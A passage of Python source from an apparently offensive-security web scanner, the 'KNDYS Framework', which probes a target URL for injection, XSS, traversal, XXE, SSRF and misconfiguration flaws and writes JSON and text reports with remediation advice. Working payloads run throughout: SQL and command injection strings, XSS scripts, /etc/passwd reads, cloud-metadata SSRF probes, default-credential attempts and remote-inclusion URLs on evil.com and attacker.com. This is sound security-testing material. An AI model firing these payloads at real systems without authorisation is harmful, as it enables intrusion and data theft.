                            'details': details,
                            'remediation': remediation
                        })
                        severity_color = self._get_severity_color(severity)
                        print(f"{severity_color}[+] {severity.upper()}: {check_name}{Style.RESET_ALL}")
                        print(f"{Fore.WHITE}    └─ {details}{Style.RESET_ALL}")
                        if stealth:
                            time.sleep(1)  # Delay for stealth mode
                except Exception as e:
                    if aggressive:
                        print(f"{Fore.RED}[-] Error in {check_name}: {str(e)}{Style.RESET_ALL}")
        
        # Calculate statistics
        elapsed = time.time() - start_time
        critical = sum(1 for v in vulnerabilities if v['severity'] == 'Critical')
        high = sum(1 for v in vulnerabilities if v['severity'] == 'High')
        medium = sum(1 for v in vulnerabilities if v['severity'] == 'Medium')
        low = sum(1 for v in vulnerabilities if v['severity'] == 'Low')
        info = sum(1 for v in vulnerabilities if v['severity'] == 'Info')
        
        # Print summary
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}VULNERABILITY SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        if vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}\n")
            print(f"{Fore.WHITE}Risk Distribution:{Style.RESET_ALL}")
            if critical > 0:
                print(f"  {Fore.RED}● Critical: {critical}{Style.RESET_ALL}")
            if high > 0:
                print(f"  {Fore.LIGHTRED_EX}● High: {high}{Style.RESET_ALL}")
            if medium > 0:
                print(f"  {Fore.YELLOW}● Medium: {medium}{Style.RESET_ALL}")
            if low > 0:
                print(f"  {Fore.LIGHTYELLOW_EX}● Low: {low}{Style.RESET_ALL}")
            if info > 0:
                print(f"  {Fore.CYAN}● Info: {info}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No vulnerabilities detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Scan completed in {elapsed:.2f} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Checks performed: {check_count}/{total_checks}{Style.RESET_ALL}\n")
        
        # Export results
        self._export_vuln_scan_results(target, scan_type, vulnerabilities, elapsed)
        
        return vulnerabilities
    
    # ============ HELPER FUNCTIONS ============
    
    def _get_severity_color(self, severity):
        """Get color based on severity"""
        colors = {
            'Critical': Fore.RED,
            'High': Fore.LIGHTRED_EX,
            'Medium': Fore.YELLOW,
            'Low': Fore.LIGHTYELLOW_EX,
            'Info': Fore.CYAN
        }
        return colors.get(severity, Fore.WHITE)
    
    def _export_vuln_scan_results(self, target, scan_type, vulnerabilities, elapsed):
        """Export vulnerability scan results to JSON and TXT"""
        timestamp = int(time.time())
        
        # JSON Export
        json_data = {
            'target': target,
            'scan_type': scan_type,
            'timestamp': timestamp,
            'scan_time': f'{elapsed:.2f}s',
            'total_vulns': len(vulnerabilities),
            'severity_breakdown': {
                'Critical': sum(1 for v in vulnerabilities if v['severity'] == 'Critical'),
                'High': sum(1 for v in vulnerabilities if v['severity'] == 'High'),
                'Medium': sum(1 for v in vulnerabilities if v['severity'] == 'Medium'),
                'Low': sum(1 for v in vulnerabilities if v['severity'] == 'Low'),
                'Info': sum(1 for v in vulnerabilities if v['severity'] == 'Info'),
            },
            'vulnerabilities': vulnerabilities
        }
        
        json_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.json'
        with open(json_file, 'w') as f:
            json.dump(json_data, f, indent=2)
        
        # TXT Export
        txt_file = f'vuln_scan_{target.replace("http://", "").replace("https://", "").replace("/", "_")}_{timestamp}.txt'
        with open(txt_file, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("VULNERABILITY SCAN REPORT - KNDYS FRAMEWORK v3.0\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Scan Type: {scan_type.upper()}\n")
            f.write(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            f.write(f"Duration: {elapsed:.2f} seconds\n")
            f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n\n")
            
            # Risk distribution
            f.write("Risk Distribution:\n")
            for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                count = sum(1 for v in vulnerabilities if v['severity'] == severity)
                if count > 0:
                    f.write(f"  {severity}: {count}\n")
            f.write("\n" + "=" * 70 + "\n\n")
            
            # Group by category
            categories = {}
            for vuln in vulnerabilities:
                cat = vuln['category']
                if cat not in categories:
                    categories[cat] = []
                categories[cat].append(vuln)
            
            for category, vulns in categories.items():
                f.write(f"CATEGORY: {category}\n")
                f.write("-" * 70 + "\n")
                for vuln in vulns:
                    f.write(f"[{vuln['severity'].upper()}] {vuln['name']}\n")
                    f.write(f"Details: {vuln['details']}\n")
                    f.write(f"Remediation: {vuln['remediation']}\n")
                    f.write("\n")
                f.write("\n")
        
        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f"  • {json_file}")
        print(f"  • {txt_file}")
    
    # ============ 33 CHECK FUNCTIONS ============
    
    # Category 1: Injection (5 checks)
    
    def _check_sql_error_based(self, url):
        """Check for error-based SQL injection"""
        payloads = ["'", '"', "')", "';", "' AND 1=CONVERT(int, @@version)--", "' OR 1=CAST(@@version AS INT)--"]
        error_patterns = [
            r"SQL.*error", r"Warning.*mysql", r"PostgreSQL.*ERROR", r"ORA-\d+",
            r"Microsoft.*Driver", r"syntax.*error", r"unclosed.*quotation", r"unterminated.*string"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return ('Critical', f"SQL error with payload: {payload}", "Use parameterized queries, input validation")
            except:
                pass
        return None
    
    def _check_sql_time_based(self, url):
        """Check for time-based SQL injection"""
        time_payloads = ["' OR SLEEP(5)--", "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "' OR pg_sleep(5)--"]
        
        for payload in time_payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4:
                    return ('Critical', f"Time-based SQLi with delay: {elapsed:.2f}s", "Use parameterized queries")
            except requests.exceptions.Timeout:
                return ('Critical', f"Timeout-based SQLi with payload: {payload}", "Use parameterized queries")
            except:
                pass
        return None
    
    def _check_nosql_injection(self, url):
        """Check for NoSQL injection (MongoDB)"""
        payloads = ["[$ne]=1", "{'$ne': null}", "{'$gt': ''}", "admin'||'1'=='1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if response.status_code == 200 and len(response.text) > 100:
                    return ('High', f"Potential NoSQL injection with: {payload}", "Sanitize NoSQL queries, use ODM")
            except:
                pass
        return None
    
    def _check_command_injection_advanced(self, url):
        """Check for command injection"""
        payloads = ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "|| ping -c 5 127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                start = time.time()
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=15, verify=False)
                elapsed = time.time() - start
                if elapsed > 4 or 'uid=' in response.text:
                    return ('Critical', f"Command injection detected: {payload}", "Never execute user input, use safe APIs")
            except:
                pass
        return None
    
    def _check_ldap_injection(self, url):
        """Check for LDAP injection"""
        payloads = ["*", "*)(uid=*", "admin*", "*()|&'"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'ldap' in response.text.lower() or 'directory' in response.text.lower():
                    return ('Medium', f"Potential LDAP injection: {payload}", "Escape LDAP special characters")
            except:
                pass
        return None
    
    # Category 2: XSS (3 checks)
    
    def _check_reflected_xss(self, url):
        """Check for reflected XSS"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if payload in response.text or payload.replace('"', '&quot;') in response.text:
                    return ('High', f"Reflected XSS with: {payload[:30]}...", "Encode output, use CSP headers")
            except:
                pass
        return None
    
    def _check_stored_xss(self, url):
        """Check for stored XSS (basic check)"""
        payload = f"<script>alert('stored-{int(time.time())}')</script>"
        try:
            requests.post(url, data={'comment': payload}, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if payload in response.text:
                return ('Critical', "Stored XSS detected in comment field", "Sanitize stored data, encode on output")
        except:
            pass
        return None
    
    def _check_dom_xss(self, url):
        """Check for DOM-based XSS"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            dangerous_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval(', 'setTimeout', 'location.href']
            if any(sink in response.text for sink in dangerous_sinks):
                return ('Medium', "Potential DOM XSS sinks detected", "Avoid unsafe DOM manipulation")
        except:
            pass
        return None
    
    # Category 3: Broken Authentication (3 checks)
    
    def _check_weak_auth(self, url):
        """Check for weak authentication"""
        creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root'), ('test', 'test')]
        
        for user, pwd in creds:
            try:
                response = requests.post(url, data={'username': user, 'password': pwd}, timeout=10, verify=False)
                if response.status_code == 200 and 'dashboard' in response.text.lower():
                    return ('Critical', f"Weak credentials: {user}:{pwd}", "Enforce strong password policy")
            except:
                pass
        return None
    
    def _check_session_mgmt(self, url):
        """Check session management"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            cookies = response.cookies
            issues = []
            for cookie in cookies:
                if not cookie.secure:
                    issues.append(f"Cookie {cookie.name} missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append(f"Cookie {cookie.name} missing HttpOnly flag")
            if issues:
                return ('Medium', '; '.join(issues), "Set Secure and HttpOnly flags on cookies")
        except:
            pass
        return None
    
    def _check_jwt_vulns(self, url):
        """Check for JWT vulnerabilities"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'authorization' in response.headers.get('Authorization', '').lower():
                token = response.headers['Authorization'].replace('Bearer ', '')
                if token.count('.') == 2:
                    header = token.split('.')[0]
                    decoded = json.loads(base64.b64decode(header + '=='))
                    if decoded.get('alg') == 'none':
                        return ('Critical', "JWT with 'none' algorithm", "Validate JWT signature, reject 'none' alg")
        except:
            pass
        return None
    
    # Category 4: Sensitive Data (4 checks)
    
    def _check_ssl_config(self, url):
        """Check SSL/TLS configuration"""
        if url.startswith('https'):
            try:
                response = requests.get(url, timeout=10)
                if not response.url.startswith('https'):
                    return ('High', "HTTPS downgrade detected", "Enforce HTTPS with HSTS")
            except:
                return ('High', "SSL/TLS certificate error", "Use valid SSL certificate")
        else:
            return ('Medium', "Site not using HTTPS", "Migrate to HTTPS")
        return None
    
    def _check_sensitive_files(self, url):
        """Check for exposed sensitive files"""
        files = ['.env', '.git/config', 'config.php', 'backup.sql', 'id_rsa', '.htaccess', 'web.config']
        
        for file in files:
            try:
                test_url = f"{url}/{file}" if not url.endswith('/') else f"{url}{file}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Sensitive file exposed: {file}", "Remove or protect sensitive files")
            except:
                pass
        return None
    
    def _check_info_disclosure(self, url):
        """Check for information disclosure"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            if 'Server' in response.headers:
                server = response.headers['Server']
                if any(tech in server.lower() for tech in ['apache/2', 'nginx/1', 'iis/7', 'php/5']):
                    return ('Low', f"Server version disclosed: {server}", "Remove server version headers")
        except:
            pass
        return None
    
    def _check_security_headers_advanced(self, url):
        """Check for missing security headers"""
        try:
            response = requests.get(url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
            missing = []
            headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'X-XSS-Protection': 'XSS filter'
            }
            for header, desc in headers.items():
                if header not in response.headers:
                    missing.append(desc)
            if missing:
                return ('Medium', f"Missing headers: {', '.join(missing)}", "Implement security headers")
        except:
            pass
        return None
    
    # Category 5: XXE (2 checks)
    
    def _check_xxe_advanced(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        try:
            response = requests.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'root:' in response.text:
                return ('Critical', "XXE: /etc/passwd read successful", "Disable XML external entities")
        except:
            pass
        return None
    
    def _check_dtd_injection(self, url):
        """Check for DTD injection"""
        dtd_payload = '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"><root></root>'
        try:
            response = requests.post(url, data=dtd_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if 'attacker' in response.text or response.status_code == 500:
                return ('High', "DTD injection possible", "Disable DTD processing")
        except:
            pass
        return None
    
    # Category 6: Access Control (3 checks)
    
    def _check_idor(self, url):
        """Check for IDOR vulnerabilities"""
        if 'id=' in url or '/user/' in url or '/profile/' in url:
            return ('Medium', "Potential IDOR in URL parameters", "Implement access control checks")
        return None
    
    def _check_path_traversal_advanced(self, url):
        """Check for path traversal"""
        payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                response = requests.get(test_url, headers={'User-Agent': self.config['user_agent']}, timeout=10, verify=False)
                if 'root:' in response.text or '[extensions]' in response.text:
                    return ('High', f"Path traversal with: {payload}", "Validate and sanitize file paths")
            except:
                pass
        return None
    
    def _check_forced_browsing(self, url):
        """Check for forced browsing"""
        paths = ['/admin', '/config', '/backup', '/phpinfo.php', '/test', '/dev']
        
        for path in paths:
            try:
                test_url = f"{url}{path}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('Medium', f"Accessible path: {path}", "Implement proper access controls")
            except:
                pass
        return None
    
    # Category 7: Security Misconfiguration (13 checks)
    
    def _check_cors(self, url):
        """Check for CORS misconfiguration"""
        try:
            response = requests.get(url, headers={'Origin': 'http://evil.com'}, timeout=10, verify=False)
            if response.headers.get('Access-Control-Allow-Origin') == '*':
                return ('High', "CORS allows all origins (*)", "Restrict CORS to specific origins")
            if response.headers.get('Access-Control-Allow-Origin') == 'http://evil.com':
                return ('High', "CORS reflects arbitrary origin", "Validate allowed origins")
        except:
            pass
        return None
    
    def _check_http_methods(self, url):
        """Check for dangerous HTTP methods"""
        try:
            response = requests.options(url, timeout=10, verify=False)
            if 'Allow' in response.headers:
                methods = response.headers['Allow']
                dangerous = [m for m in ['PUT', 'DELETE', 'TRACE', 'CONNECT'] if m in methods]
                if dangerous:
                    return ('Medium', f"Dangerous HTTP methods: {', '.join(dangerous)}", "Disable unnecessary HTTP methods")
        except:
            pass
        return None
    
    def _check_default_creds(self, url):
        """Check for default credentials"""
        return ('Info', "Manual check recommended for default credentials", "Change default credentials")
    
    def _check_verbose_errors(self, url):
        """Check for verbose error messages"""
        try:
            test_url = f"{url}/nonexistent-page-12345"
            response = requests.get(test_url, timeout=10, verify=False)
            if any(err in response.text.lower() for err in ['traceback', 'exception', 'stack trace', 'error at line']):
                return ('Low', "Verbose error messages detected", "Implement custom error pages")
        except:
            pass
        return None
    
    def _check_debug_mode(self, url):
        """Check for debug mode enabled"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if any(debug in response.text.lower() for debug in ['debug mode', 'debug=true', 'debugger', 'xdebug']):
                return ('Medium', "Debug mode appears enabled", "Disable debug mode in production")
        except:
            pass
        return None
    
    def _check_csrf_advanced(self, url):
        """Check for CSRF protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form', method='post')
            for form in forms:
                has_token = any(inp.get('name', '').lower() in ['csrf', 'token', '_token'] for inp in form.find_all('input'))
                if not has_token:
                    return ('Medium', "POST form without CSRF token", "Implement CSRF tokens")
        except:
            pass
        return None
    
    def _check_clickjacking(self, url):
        """Check for clickjacking protection"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            if 'X-Frame-Options' not in response.headers and 'Content-Security-Policy' not in response.headers:
                return ('Medium', "No clickjacking protection", "Set X-Frame-Options or CSP frame-ancestors")
        except:
            pass
        return None
    
    def _check_open_redirect(self, url):
        """Check for open redirect"""
        payloads = ["http://evil.com", "//evil.com", "https://evil.com"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?redirect={payload}"
                response = requests.get(test_url, allow_redirects=False, timeout=10, verify=False)
                if response.status_code in [301, 302] and payload in response.headers.get('Location', ''):
                    return ('Medium', f"Open redirect to: {payload}", "Validate redirect URLs")
            except:
                pass
        return None
    
    def _check_ssrf_advanced(self, url):
        """Check for SSRF vulnerabilities"""
        payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost", "http://127.0.0.1"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?url={payload}"
                response = requests.get(test_url, timeout=10, verify=False)
                if 'ami-id' in response.text or len(response.text) > 0:
                    return ('High', f"Potential SSRF to: {payload}", "Validate and restrict URL parameters")
            except:
                pass
        return None
    
    def _check_outdated_libs(self, url):
        """Check for outdated JavaScript libraries"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            outdated = []
            patterns = [
                (r'jquery[-.]?(\d+\.\d+)', '1.9', 'jQuery'),
                (r'angular[-.]?(\d+\.\d+)', '1.6', 'AngularJS'),
                (r'bootstrap[-.]?(\d+)', '4', 'Bootstrap')
            ]
            for pattern, min_ver, lib in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match and match.group(1) < min_ver:
                    outdated.append(f"{lib} {match.group(1)}")
            if outdated:
                return ('Medium', f"Outdated libraries: {', '.join(outdated)}", "Update JavaScript libraries")
        except:
            pass
        return None
    
    def _check_api_docs(self, url):
        """Check for exposed API documentation"""
        endpoints = ['/api/docs', '/swagger', '/api-docs', '/swagger-ui', '/api/swagger.json']
        
        for endpoint in endpoints:
            try:
                test_url = f"{url}{endpoint}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'api' in response.text.lower()):
                    return ('Info', f"API documentation at: {endpoint}", "Protect API documentation")
            except:
                pass
        return None
    
    def _check_backup_files(self, url):
        """Check for accessible backup files"""
        extensions = ['.bak', '.old', '.backup', '~', '.swp', '.zip', '.tar.gz']
        
        for ext in extensions:
            try:
                test_url = f"{url}/backup{ext}"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    return ('High', f"Backup file accessible: backup{ext}", "Remove backup files from web root")
            except:
                pass
        return None
    
    def _check_host_header_injection(self, url):
        """Check for host header injection"""
        try:
            response = requests.get(url, headers={'Host': 'evil.com'}, timeout=10, verify=False)
            if 'evil.com' in response.text:
                return ('Medium', "Host header injection detected", "Validate Host header")
        except:
            pass
        return None

    def check_sql_injection(self, url):
        """Advanced SQL injection check"""
        payloads = [
            "'", "\"", "' OR '1'='1", "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, @@version)--", "1; SELECT pg_sleep(5)--",
            "' OR SLEEP(5) AND '1'='1", "' OR BENCHMARK(1000000, MD5('A'))--"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for error messages
                error_indicators = [
                    'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
                    'database', 'query', 'unclosed', 'unterminated'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in error_indicators):
                    return f"Error-based SQLi with payload: {payload}"
                
                # Check for time delays
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5:
                    return f"Time-based SQLi with payload: {payload} (delay: {elapsed:.2f}s)"
                    
            except requests.exceptions.Timeout:
                return f"Potential time-based SQLi (timeout with payload: {payload})"
            except:
                continue
        
        return None
    
    def check_xss(self, url):
        """Advanced XSS check"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if payload in response.text:
                    return f"Reflected XSS with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_csrf(self, url):
        """Check for CSRF vulnerabilities"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Look for forms without CSRF tokens
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                has_csrf = False
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    if input_tag.get('name', '').lower() in ['csrf', 'token', '_token', 'csrf_token']:
                        has_csrf = True
                        break
                
                if not has_csrf and form.get('action'):
                    return f"Form without CSRF protection: {form.get('action')}"
                    
        except:
            pass
        
        return None
    
    def check_dir_traversal(self, url):
        """Check for directory traversal"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\win.ini",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                content = response.text.lower()
                if 'root:' in content or '[extensions]' in content:
                    return f"Directory traversal with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_file_inclusion(self, url):
        """Check for file inclusion vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "http://evil.com/shell.txt"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if 'root:' in response.text or '<?php' in response.text:
                    return f"File inclusion with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_ssrf(self, url):
        """Check for SSRF vulnerabilities"""
        test_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://127.0.0.1:22/"
        ]
        
        for test_url in test_urls:
            try:
                payload_url = f"{url}?url={test_url}"
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(payload_url, headers=headers, timeout=10, verify=False)
                
                if 'ami-id' in response.text or 'ssh' in response.text.lower():
                    return f"Potential SSRF to: {test_url}"
            except:
                continue
        
        return None
    
    def check_xxe(self, url):
        """Check for XXE vulnerabilities"""
        xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
        
        try:
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'application/xml'
            }
            response = requests.post(url, data=xxe_payload, headers=headers, timeout=10, verify=False)
            
            if 'root:' in response.text:
                return "XXE vulnerability detected"
        except:
            pass
        
        return None
    
    def check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        payloads = [
            "; ls -la",
            "| dir",
            "`whoami`",
            "$(id)",
            "|| ping -c 5 127.0.0.1"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{url}{payload}"
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 5 or 'uid=' in response.text or 'Directory of' in response.text:
                    return f"Command injection with payload: {payload}"
            except:
                continue
        
        return None
    
    def check_security_headers(self, url):
        """Check for missing security headers"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options (clickjacking protection)',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options (MIME sniffing protection)',
                'X-XSS-Protection': 'Missing X-XSS-Protection (XSS filter)',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing Content-Security-Policy',
                'Referrer-Policy': 'Missing Referrer-Policy'
            }
            
            vulns = []
            for header, message in security_headers.items():
                if header not in response.headers:
                    vulns.append(("Security Headers", message))
            
            return vulns
        except:
            return []
    
    def run_sql_scanner(self):
        """Advanced SQL injection scanner"""
        url = self.module_options['url']
        technique = self.module_options.get('technique', 'time_based,error_based,boolean')
        
        print(f"{Fore.CYAN}[*] Scanning for SQL injection: {url}{Style.RESET_ALL}")
        
        techniques = technique.split(',')
        results = []
        
        # Test each technique
        if 'error_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing error-based SQLi{Style.RESET_ALL}")
            result = self.test_error_based_sqli(url)
            if result:
                results.append(("Error-based", result))
        
        if 'time_based' in techniques:
            print(f"{Fore.YELLOW}[*] Testing time-based SQLi{Style.RESET_ALL}")
            result = self.test_time_based_sqli(url)
            if result:
                results.append(("Time-based", result))
        
        if 'boolean' in techniques:
            print(f"{Fore.YELLOW}[*] Testing boolean-based SQLi{Style.RESET_ALL}")
            result = self.test_boolean_sqli(url)
            if result:
                results.append(("Boolean-based", result))
        
        if 'union' in techniques:
            print(f"{Fore.YELLOW}[*] Testing UNION-based SQLi{Style.RESET_ALL}")
            result = self.test_union_sqli(url)
            if result:
                results.append(("UNION-based", result))
        
        print(f"\n{Fore.CYAN}[*] SQL injection scan completed{Style.RESET_ALL}")
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} SQL injection vulnerabilities{Style.RESET_ALL}")
            for vuln_type, details in results:
                print(f"  {vuln_type}: {details}")
        else:
            print(f"{Fore.YELLOW}[*] No SQL injection vulnerabilities found{Style.RESET_ALL}")
    
    def test_error_based_sqli(self, url):
        """Test for error-based SQL injection"""
        payloads = [
            "'", "\"", "'\"", "\"'", "`",
            "' AND 1=CONVERT(int, @@version)--",
            "' OR 1=CONVERT(int, @@version)--"
        ]
        
        for payload in payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                error_patterns = [
                    r"SQL.*error",
                    r"Warning.*mysql",
                    r"PostgreSQL.*ERROR",
                    r"ORA-\d+",
                    r"Microsoft.*Driver",
                    r"syntax.*error",
                    r"unclosed.*quotation",
                    r"unterminated.*string"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return f"Error with payload: {payload}"
                        
            except:
                continue
        
        return None
    
    def test_time_based_sqli(self, url):
        """Test for time-based SQL injection"""
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000, MD5('A'))--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in time_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                start = time.time()
                response = requests.get(test_url, headers=headers, timeout=15, verify=False)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    return f"Time delay ({elapsed:.2f}s) with payload: {payload}"
                    
            except requests.exceptions.Timeout:
                return f"Timeout with payload: {payload}"
            except:
                continue
        
        return None
    
    def test_boolean_sqli(self, url):
        """Test for boolean-based SQL injection"""
        # This is a simplified check
        true_conditions = ["' OR '1'='1", "' OR 1=1--"]
        false_conditions = ["' OR '1'='2", "' OR 1=2--"]
        
        try:
            # Get original response
            headers = {'User-Agent': self.config['user_agent']}
            original = requests.get(url, headers=headers, timeout=10, verify=False)
            original_length = len(original.text)
            
            for true_payload, false_payload in zip(true_conditions, false_conditions):
                true_url = url.replace('=', f"={true_payload}")
                false_url = url.replace('=', f"={false_payload}")
                
                true_resp = requests.get(true_url, headers=headers, timeout=10, verify=False)
                false_resp = requests.get(false_url, headers=headers, timeout=10, verify=False)
                
                # Check for differences
                if len(true_resp.text) != len(false_resp.text):
                    return f"Boolean condition difference with payloads: {true_payload}/{false_payload}"
                    
        except:
            pass
        
        return None
    
    def test_union_sqli(self, url):
        """Test for UNION-based SQL injection"""
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version,2,3--"
        ]
        
        for payload in union_payloads:
            try:
                test_url = url.replace('=', f"={payload}")
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check for database information
                db_indicators = [
                    'mysql', 'postgresql', 'oracle', 'sqlite',
                    'microsoft sql', 'mariadb', 'database'
                ]
                
                content = response.text.lower()
                if any(indicator in content for indicator in db_indicators):
                    return f"UNION query with payload: {payload}"
                    
            except:
